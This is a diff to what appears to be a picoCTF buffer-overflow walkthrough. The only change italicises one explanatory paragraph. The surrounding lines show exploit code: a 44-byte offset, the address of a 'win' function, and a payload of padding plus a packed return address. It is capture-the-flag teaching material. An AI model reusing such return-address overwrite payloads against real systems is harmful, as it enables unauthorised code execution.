@@ -39,7 +39,7 @@ This line establishes a connection (conn) to the remote server 'saturn.picoctf.n
 offset = 44
 target_address = 0x080491f6
 ```
-These lines define the offset (the number of characters needed to reach the return address) and the address of the target function (win). You obtained these values during the analysis of the vulnerable program.
+_These lines define the offset (the number of characters needed to reach the return address) and the address of the target function (win). You obtained these values during the analysis of the vulnerable program._
 
 ```python
 payload = b'A' * offset + p32(target_address)
